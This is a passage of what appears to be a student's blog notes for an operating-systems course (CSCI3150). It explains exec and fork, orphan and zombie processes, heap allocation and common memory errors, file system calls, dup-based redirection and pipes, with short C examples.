class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="exec-System-Call"><a href="#exec-System-Call" class="headerlink" title="exec System Call"></a><code>exec</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To change processes.</li>
<li>The <code>fork</code> system call creates a copy of the calling process (child inherits all the properties of its parent).</li>
<li>However, many applications require the child process to <font color="f54747">executes code different from the parent’s</font>.</li>
<li>Therefore, executes <code>exec</code> family system calls to overlay the calling process with a new executable module.</li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li><code>exec</code> will load a new executable into the process image, copies the arguments into the process and calls <code>main(args, argy)</code>.</li>
<li>If succeed, <font color="f54747"><code>exec</code> never returns</font>. The calling process is completely overlaid by the new program.</li>
<li>The <code>fork-exec</code> combination can <font color="f54747">let the child execute the new program</font> while the parent continues to execute the original code.</li>
</ul>
</li>
<li><p>Variations of <code>exec</code> system call:</p>
<ul>
<li><p><code>execl</code> calls (<code>execl</code>, <code>execlp</code>, <code>execle</code>)</p>
<ul>
<li>pass the command-line arguments as <font color="f54747">a list of pointers</font>.</li>
</ul>
</li>
<li><p><code>execv</code> calls (<code>execv</code>, <code>execvp</code>, <code>execve</code>)</p>
<ul>
<li>pass the command-line arguments in <font color="f54747">an argument array</font>, which is an array of pointers <font color="7B3279">to null-terminated</font> strings (ie. must be terminated by a NULL pointer).</li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8-myexecl */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, wait(&amp;status));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a child to execute new program</span></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: fork()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child code (childpid for child is 0) */</span></span><br><span class="line">        <span class="keyword">if</span> (execvp(cmd, argv) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: execvp()\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid != wait(&amp;status))&#123;   </span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: wait()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Results: print the list</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Process-Termination"><a href="#Process-Termination" class="headerlink" title="Process Termination"></a>Process Termination</h2><h3 id="Two-Terminations"><a href="#Two-Terminations" class="headerlink" title="Two Terminations"></a>Two Terminations</h3><ol>
<li><p><strong>Normal Process Termination</strong></p>
<ul>
<li>A process terminates normally when,<ol>
<li>a <code>return</code> from <code>main</code></li>
<li>an implicit return from main</li>
<li>a call to the <code>_exit</code> system call</li>
<li>a call to the C function <code>exit</code></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>Abnormal Process Termination</strong></p>
<ul>
<li>A process terminates abnormally when,<ol>
<li>calling <code>abort</code>, causing the SIGABRT signal to be sent to the calling process.</li>
<li>processing a signal that causes termination.</li>
</ol>
</li>
<li>User-installed exit handler will not be called upon abnormal termination.</li>
</ul>
</li>
</ol>
<h3 id="Orphan-Process"><a href="#Orphan-Process" class="headerlink" title="Orphan Process"></a>Orphan Process</h3><ul>
<li><p>it occurs if when the child still executing but its parent has terminated.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-orphan */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>  <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">10</span>);      <span class="comment">// the child has not been terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">1</span>);       <span class="comment">// the parent is terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Zombie-Process"><a href="#Zombie-Process" class="headerlink" title="Zombie Process"></a>Zombie Process</h3><ul>
<li><p>it occurs if the parent of the terminating process is not currently executing a <code>wait()</code>.</p>
</li>
<li><p>Noted: <font color="f54747">the zombie process is not an orphan process</font>.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-1-zombie */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>  <span class="keyword">if</span> (childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">100</span>);     <span class="comment">// child process is terminated but parent does not</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID - %d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    ls -l</span></span><br><span class="line"><span class="comment">        UID   PID  PPID  S</span></span><br><span class="line"><span class="comment">        501  4276  4275  Z+      // this is the zombie process</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (Memory)</title>
    <url>/myBlog/2022/09/18/2022/CSCI3150/2022-9-17-CSCI3150-SystemCall-Memory/</url>
    <content><![CDATA[<h2 id="Memory-Allocation"><a href="#Memory-Allocation" class="headerlink" title="Memory Allocation"></a>Memory Allocation</h2><h3 id="Memory-API-malloc"><a href="#Memory-API-malloc" class="headerlink" title="Memory API malloc"></a>Memory API <code>malloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate a memory region on the <font color="7B3279">heap</font>.</li>
</ul>
</li>
<li><p>Syntax: <code>void* malloc(size_t size)</code></p>
<ul>
<li><code>size_t size</code>: the size of the memory block (in bytes)</li>
<li><code>size_t</code>: is an unsigned integer type</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to the memory block allocated by <code>malloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Function-sizeof"><a href="#Function-sizeof" class="headerlink" title="Function sizeof"></a>Function <code>sizeof</code></h3><ul>
<li>Description:<ul>
<li><p>Usually use <code>size</code> in <code>malloc</code> instead of typing a number.</p>
</li>
<li><p>Two types of results of <code>sizeof</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The actual size of &#x27;x&#x27; is known at run-time */</span></span><br><span class="line"><span class="type">int</span> *x = <span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(x))       <span class="comment">// 4 (size of a pointer)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The actual size of &#x27;y&#x27; is known at compile-time */</span></span><br><span class="line"><span class="type">int</span> y[<span class="number">10</span>]</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(y))       <span class="comment">// 40 (y is static)</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Memory-API-free"><a href="#Memory-API-free" class="headerlink" title="Memory API free"></a>Memory API <code>free</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>To free a memory region allocated by a call to <code>malloc</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>void free(void *ptr)</code></p>
<ul>
<li><code>void *ptr</code> is a pointer to a memory block allocated with <code>malloc</code></li>
</ul>
</li>
<li><p>Return <code>none</code></p>
</li>
</ul>
<h3 id="Memory-API-calloc"><a href="#Memory-API-calloc" class="headerlink" title="Memory API calloc"></a>Memory API <code>calloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate memory on the <font color="7B3279">heap</font> and set with <font color="7B3279">zero</font> before returning.</li>
</ul>
</li>
<li><p>Syntax: <code>void* calloc(size_t num, size_t size)</code></p>
<ul>
<li><code>size_t num</code>: number of block to allocate</li>
<li><code>size_t size</code>: size of each block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block allocated by <code>calloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Memory-API-realloc"><a href="#Memory-API-realloc" class="headerlink" title="Memory API realloc"></a>Memory API <code>realloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Change the size of memory block.</li>
</ul>
</li>
<li><p>Syntax: <code>void* realloc(void *ptr, size_t size)</code></p>
<ul>
<li><code>void *ptr</code>: pointer to memory block allocated with <code>malloc</code>, <code>calloc</code> or <code>realloc</code></li>
<li><code>size_t size</code>: new size for the memory block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block</li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h2 id="Common-Error"><a href="#Common-Error" class="headerlink" title="Common Error"></a>Common Error</h2><h3 id="Forget-To-Allocate-Memory"><a href="#Forget-To-Allocate-Memory" class="headerlink" title="Forget To Allocate Memory"></a>Forget To Allocate Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>created a pointer but forgot to allocate the memory</li>
<li>if operating (e.g. <code>strcpy</code>) that pointer, then it reports an error</li>
</ul>
</li>
<li><p>Incorrect Code (Error):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Incorrect Code */</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;    <span class="comment">// character string constant</span></span><br><span class="line"><span class="type">char</span> *dst;              <span class="comment">// unallocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);       <span class="comment">// segfault and die</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/5lvhn0.png" height="250px">

</li>
<li><p>Correct Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src) + <span class="number">1</span>);    <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/4vepuz.png" height="250px"></li>
</ul>
<h3 id="Allocated-Small-Memory"><a href="#Allocated-Small-Memory" class="headerlink" title="Allocated Small Memory"></a>Allocated Small Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>do not allocate the pointer with enough memory</li>
<li>it works properly</li>
</ul>
</li>
<li><p>Incorrect Code (but work properly):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src));    <span class="comment">// too small</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/tirikq.png" height="250px"></li>
</ul>
<h3 id="Forget-to-Initialize"><a href="#Forget-to-Initialize" class="headerlink" title="Forget to Initialize"></a>Forget to Initialize</h3><ul>
<li><p>Description:</p>
<ul>
<li>use an uninitialized the pointer</li>
<li>it will <font colro="f54747">allocate with the value used before</font></li>
</ul>
</li>
<li><p>Incorrect Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *x = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*x = %d\n&quot;</span>, *x);               <span class="comment">// uninitialized memory access</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/ue92hb.png" height="250px"></li>
</ul>
<h3 id="Memory-Leak"><a href="#Memory-Leak" class="headerlink" title="Memory Leak"></a>Memory Leak</h3><ul>
<li>Description:<ul>
<li>do not <code>free</code> the used memory access</li>
<li>the program will run out of memory  <img src="https://p.ipic.vip/kkfjbf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Dangling-Pointer-迷途指針"><a href="#Dangling-Pointer-迷途指針" class="headerlink" title="Dangling Pointer 迷途指針"></a>Dangling Pointer 迷途指針</h3><ul>
<li>Description:<ul>
<li>freeing the memory before it is finished using</li>
<li>the program accesses to that memory with invalid pointer  <img src="https://p.ipic.vip/13k2pf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><ul>
<li>Description:<ul>
<li>Free the memory that was freed before</li>
<li>it reports an undefined error  <img src="https://p.ipic.vip/70g8sl.png" height="150px"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (File &amp; Directory)</title>
    <url>/myBlog/2022/09/20/2022/CSCI3150/2022-9-20-CSCI3150-SystemCall-F&amp;D/</url>
    <content><![CDATA[<h2 id="File-amp-Directory"><a href="#File-amp-Directory" class="headerlink" title="File &amp; Directory"></a>File &amp; Directory</h2><ol>
<li><p>File</p>
<ul>
<li>A container to contain data of a file (provides a linear space so that stores the data linearly).</li>
<li>Each file has a low-level name (<font color="f54747">inode number</font>).</li>
</ul>
</li>
<li><p>Directory</p>
<ul>
<li>An implement directory tree (directory hierarchy).</li>
<li>It also has a low level name.</li>
<li>It contains a list of file name and inode number pair.</li>
</ul>
</li>
</ol>
<h2 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h2><h3 id="open-System-Call"><a href="#open-System-Call" class="headerlink" title="open System Call"></a><code>open</code> System Call</h3><ul>
<li><p>Syntax: <code>int open(const char *pathname, int oflags);</code></p>
<ul>
<li><code>O_RDONLY</code>: Read only</li>
<li><code>O_WRONLY</code>: Write only</li>
<li><code>O_RDWR</code>: Read and write.</li>
<li><code>O_CREAT</code>: If the pathname does not exist, create it as a regular file.</li>
<li><code>O_TRUNC</code>: If the file already exists and is a regular file and the access mode allows writing, it will be truncated to length 0.</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li><font color="f54747">file descriptor</font> which is an integer to access files.</li>
</ul>
</li>
</ul>
<h3 id="open-Process"><a href="#open-Process" class="headerlink" title="open Process"></a><code>open</code> Process</h3><ul>
<li><p>After executing <code>open</code> system call, it undergoes:</p>
<ol>
<li>The file descriptor specifies the index into File Descriptor Table (FDT) of the process.</li>
<li>The entries of FDT contain pointers to entries in the System File Table (SFT).</li>
<li>When a file is opened, an entry is created in both FDT and SFT.</li>
<li>SFT entry contains information about whether a file is open for read, write, protection, or lock and the file offset.</li>
</ol>
  <img src="https://p.ipic.vip/h8cq11.png" width="400px">
  </li>
<li><p>The file descriptor for the created file is <code>3</code>.</p>
</li>
<li><p>Because when a process is created, file descriptor <code>0</code>, <code>1</code>, <code>2</code> are opened by the default for standard input, output and error.</p>
</li>
</ul>
<h3 id="read-System-Call"><a href="#read-System-Call" class="headerlink" title="read System Call"></a><code>read</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it read.</li>
</ul>
</li>
</ul>
<h3 id="write-System-Call"><a href="#write-System-Call" class="headerlink" title="write System Call"></a><code>write</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t write(int fd, const *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it write.</li>
</ul>
</li>
</ul>
<h3 id="lseek-System-Call"><a href="#lseek-System-Call" class="headerlink" title="lseek System Call"></a><code>lseek</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>An open file has a <font color="f54747">current offset</font> to determine where the next read or write will begin reading from or writing to within the file.</li>
<li><code>lseek</code> is used to update the current offset explicitly.</li>
</ul>
</li>
<li><p>Syntax: <code>off_t lseek(int fd, off_t offset, int whence);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>offset</code>: position the file offset to particular location within the file</li>
<li><code>whence</code>: determine how the seek is performed<ul>
<li><code>SEEK_SET</code>: the offset is set to offset bytes (offset)</li>
<li><code>SEEK_CUR</code>: the offset is set to offset bytes + its current location (offset + current)</li>
<li><code>SEEK_END</code>: the offset is set to offset bytes + the size of the file (offset + the end)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ol>
<li>File Operations: <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">20</span>] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="type">char</span> rbuf1[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// open or create &quot;myfile&quot;</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR );</span><br><span class="line"></span><br><span class="line">write(fd, buf, <span class="number">20</span>);         <span class="comment">// write buf into fd</span></span><br><span class="line">lseek(fd, <span class="number">0</span>, SEEK_SET);     <span class="comment">// update the offset to the start</span></span><br><span class="line">read(fd, rbuf1, <span class="number">20</span>);        <span class="comment">// read the content in fd (buf) and store into rbuf1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf1);      <span class="comment">// Hello World!</span></span><br><span class="line"></span><br><span class="line">lseek(fd, <span class="number">6</span>, SEEK_SET);     <span class="comment">// update the offset to the start + 6</span></span><br><span class="line">read(fd, rbuf2, <span class="number">20</span>);        <span class="comment">// read the content and store into rbuf2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf2);      <span class="comment">// World!</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="I-x2F-O-Redirection"><a href="#I-x2F-O-Redirection" class="headerlink" title="I&#x2F;O Redirection"></a>I&#x2F;O Redirection</h2><h3 id="Redirection"><a href="#Redirection" class="headerlink" title="Redirection"></a>Redirection</h3><ol>
<li><p>Redirection</p>
<ul>
<li>it means that the process modifies its File Descriptor Table (FDT) entry so that it points to a different entry in the System File Table (SFT).</li>
</ul>
</li>
<li><p>Example</p>
<ul>
<li>The command <code>cat</code> reads from a file and echoes to <font color="f54747">standard output</font></li>
<li>Suppose the <code>myfile</code> contains “Hello World” content, <code>ls -l &gt; myfile</code> command redirects standard output to <code>myfile</code>:  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># output: Hello World</span></span><br><span class="line"><span class="built_in">ls</span> -l &gt; myfile</span><br><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
<li>Coding  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-2-redirection-exec */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">5</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">&quot;myfile&quot;</span>;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    execvp(cmd, argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="dup-System-Call"><a href="#dup-System-Call" class="headerlink" title="dup System Call"></a><code>dup</code> System Call</h3><ul>
<li><p>Description:<br>  <code>dup</code> is a smart function that can duplicate (copy) the file descriptor <code>fd</code> to the lowest-numbered unused file descriptor in the File Descriptor Table (FDT).</p>
</li>
<li><p>Syntax: <code>int dup(int fd)</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success, return a new file descriptor</li>
<li>Error, return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>Redirects standard output  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-redirection */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT |O_TRUNC |O_RDWR, S_IRUSR| S_IWUSR );</span><br><span class="line">    close(<span class="number">1</span>);		<span class="comment">// Close the stdout</span></span><br><span class="line">    dup(fd);		<span class="comment">// Duplicate fd</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;    </span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;     </span><br><span class="line">    argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execvp(cmd, argv); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Processes-Communication"><a href="#Processes-Communication" class="headerlink" title="Processes Communication"></a>Processes Communication</h2><h3 id="pipe-System-Call"><a href="#pipe-System-Call" class="headerlink" title="pipe System Call"></a><code>pipe</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>Pipes provide a <font color="f54747">unidirectional</font> interprocess communication channel.</li>
<li>A pipe has a <font color="7B3279">read end</font> and a <font color="7B3279">write end</font>.<ul>
<li>Data is written to the write end of a pipe can be read from the read end of the pipe.</li>
<li>If a process attempts to read from an <font color="7B3279">empty pipe</font>, then <code>read()</code> will block until the data is available.</li>
</ul>
</li>
</ul>
</li>
<li><p>Situations:</p>
<ul>
<li>If all file descriptors referring to the <font color="f54747">write end of a pipe have been closed</font>, then an attempt to <code>read()</code> from the pipe will see end-of-file.</li>
